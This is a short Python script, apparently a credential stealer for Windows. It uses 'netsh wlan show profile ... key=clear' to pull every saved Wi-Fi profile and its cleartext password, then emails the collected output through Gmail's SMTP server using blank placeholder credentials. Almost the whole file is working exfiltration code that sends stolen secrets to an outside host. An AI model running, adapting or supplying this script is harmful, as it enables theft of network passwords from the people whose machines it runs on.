#!/usr/bin/env python

import smtplib
import subprocess
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall(rb"(?:Profile\s*:\s)(.*)", networks)

# Clean up network profile names
network_names_list = [name.replace(b'\r', b'') for name in network_names_list]

result = ""

for network_name in network_names_list:
    # Use .decode() to convert bytes to a string
    network_name_str = network_name.decode('utf-8')
    command = 'netsh wlan show profile"' + network_name_str + '" key=clear'
    current_result = subprocess.check_output(command, shell=True)
    result += current_result.decode('utf-8')

email = ""
password = ""

send_mail(email, password, result)
